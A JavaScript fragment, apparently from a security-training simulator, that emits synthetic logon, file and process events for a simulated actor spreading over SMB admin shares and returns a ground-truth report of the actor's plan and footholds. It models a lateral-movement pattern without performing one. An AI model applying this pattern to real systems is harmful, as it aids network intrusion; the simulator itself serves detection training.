      const sh = this.network.hostById[src];
      const dh = this.network.hostById[dst];
      this._emit(ctx, 'auth', dst, { service: dh.os.startsWith('Windows') ? 'rdp' : 'ssh', user: this.creds.size ? [...this.creds][0] : 'administrator', srcIp: sh?.ip, result: 'success', method: 'password', logonType: 3 });
      this._emit(ctx, 'file', dst, { user: 'SYSTEM', op: 'create', path: `\\\\${dh.hostname}\\ADMIN$\\${fam.procName}` });
      this._emit(ctx, 'process', dst, { user: 'SYSTEM', parent: 'services.exe', image: fam.procName, cmdline: '--propagate --smb' });
      this.infected.set(dst, { effect: 'spread', sinceTs: ts });
    }
  }

  // Snapshot for ground truth (after-action report only).
  groundTruth() {
    return {
      actor: { id: this.actor.id, name: this.actor.name, archetype: this.actor.archetype, archetypeLabel: this.actor.archetypeLabel, objective: this.actor.objective, family: this.actor.primaryFamily, callingCard: this.actor.callingCard, infra: this.actor.infra, activeHours: this.actor.activeHours, traits: this.actor.traits },
      plan: this.plan,
      status: this.status,
      outcome: this.outcome,
      footholds: [...this.footholds],
      persistence: this.persistence,
      infected: [...this.infected.entries()].map(([host, v]) => ({ host, ...v })),
      timeline: this.timeline,
      stagesReached: STAGES.filter((s) => (this.completedStages || []).some((c) => c.stage === s) || this.currentStage === s),
    };
  }
}
